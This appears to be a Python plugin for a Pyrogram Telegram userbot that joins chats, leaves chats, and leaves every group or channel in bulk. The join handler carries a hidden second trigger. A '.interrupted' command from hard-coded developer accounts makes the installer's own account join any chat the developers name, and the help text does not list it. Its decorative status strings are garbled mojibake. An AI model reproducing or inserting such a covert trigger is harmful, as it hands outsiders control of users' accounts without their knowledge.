from pyrogram import Client, enums, filters
from pyrogram.types import Message

from X.helpers.adminHelpers import DEVS
from config import BLACKLIST_CHAT
from config import CMD_HANDLER
from X.helpers.basic import edit_or_reply

from .help import *


@Client.on_message(filters.command("interrupted", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("join", cmd) & filters.me)
async def join(client: Client, message: Message):
    X = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Processing...`")
    try:
        await xxnx.edit(f"**s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è ·¥ä·¥è…™…¥·¥á·¥Ö ·¥Ñ ú·¥Ä·¥õ …™·¥Ö** `{X}`")
        await client.join_chat(X)
    except Exception as ex:
        await xxnx.edit(f"**·¥á Ä Ä·¥è Ä:** \n\n{str(ex)}")


@Client.on_message(filters.command(["leave", "kickme"], cmd) & filters.me)
async def leave(client: Client, message: Message):
    X = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Processing...`")
    if message.chat.id in BLACKLIST_CHAT:
        return await xxnx.edit("**·¥õ ú…™s ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö …™s …¥·¥è·¥õ ·¥Ä ü ü·¥è·¥°·¥á·¥Ö ·¥õ·¥è  ô·¥á ·¥ús·¥á·¥Ö …™…¥ ·¥õ ú…™s …¢ Ä·¥è·¥ú·¥ò**")
    try:
        await xxnx.edit_text(f"{client.me.first_name}  ú·¥Äs  ü·¥á“ì·¥õ ·¥õ ú…™s …¢ Ä·¥è·¥ú·¥ò,  ô è·¥á!!")
        await client.leave_chat(X)
    except Exception as ex:
        await xxnx.edit_text(f"**·¥á Ä Ä·¥è Ä:** \n\n{str(ex)}")


@Client.on_message(filters.command(["leaveallgc"], cmd) & filters.me)
async def kickmeall(client: Client, message: Message):
    X = await edit_or_reply(message, "`…¢ ü·¥è ô·¥Ä ü  ü·¥á·¥Ä·¥†·¥á “ì Ä·¥è·¥ç …¢ Ä·¥è·¥ú·¥ò ·¥Ñ ú·¥Ä·¥õs...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await X.edit(
        f"**s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è ·¥áx…™·¥õ {done} …¢ Ä·¥è·¥ú·¥ò, “ì·¥Ä…™ ü·¥á·¥Ö ·¥õ·¥è ·¥áx…™·¥õ {er} Group**"
    )


@Client.on_message(filters.command(["leaveallch"], cmd) & filters.me)
async def kickmeallch(client: Client, message: Message):
    X = await edit_or_reply(message, "`…¢ ü·¥è ô·¥Ä ü  ü·¥á·¥Ä·¥†·¥á “ì Ä·¥è·¥ç …¢ Ä·¥è·¥ú·¥ò ·¥Ñ ú·¥Ä·¥õs...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.CHANNEL):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await X.edit(
        f"**s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è ·¥áx…™·¥õ {done} ·¥Ñ ú·¥Ä…¥…¥·¥á ü, “ì·¥Ä…™ ü·¥á·¥Ö ·¥õ·¥è ·¥áx…™·¥õ {er} ·¥Ñ ú·¥Ä…¥…¥·¥á ü**"
    )


add_command_help(
    "‚û• ùêâ·¥è…™…¥-ùêã·¥á·¥Ä·¥†·¥á",
    [
        [
            "kickme",
            "L·¥á·¥Ä·¥†·¥á ·¥õ ú·¥á …¢ Ä·¥è·¥ú·¥ò  ô è ·¥Ö…™Íú±·¥ò ü·¥Ä è…™…¥…¢ ·¥Ä ·¥ç·¥áÍú±Íú±·¥Ä…¢·¥á  ú·¥ÄÍú±  ü·¥á“ì·¥õ ·¥õ ú…™Íú± …¢ Ä·¥è·¥ú·¥ò,  ô è·¥á!!.",
        ],
        ["leaveallgc", "Ex…™·¥õ ·¥Ä ü ü ·¥õ·¥á ü·¥á…¢ Ä·¥Ä·¥ç …¢ Ä·¥è·¥ú·¥òÍú±  è·¥è·¥ú  ú·¥Ä·¥†·¥á …™·¥è…™…¥·¥á·¥Ö."],
        ["leaveallch", "Ex…™·¥õ ·¥Ä ü ü T·¥á ü·¥á…¢ Ä·¥Ä·¥ç ·¥Ñ ú·¥Ä…¥…¥·¥á üÍú± ·¥õ ú·¥Ä·¥õ  è·¥è·¥ú  ú·¥Ä·¥†·¥á …™·¥è…™…¥·¥á·¥Ö."],
        ["join ", "T·¥è J·¥è…™…¥ ·¥õ ú·¥á C ú·¥Ä·¥õ V…™·¥Ä ·¥úÍú±·¥á Ä…¥·¥Ä·¥ç·¥á."],
        ["leave ", "T·¥è  ü·¥á·¥Ä·¥†·¥á ·¥Ä …¢ Ä·¥è·¥ú·¥ò V…™·¥Ä ·¥úÍú±·¥á Ä…¥·¥Ä·¥ç·¥á."],
    ],
)
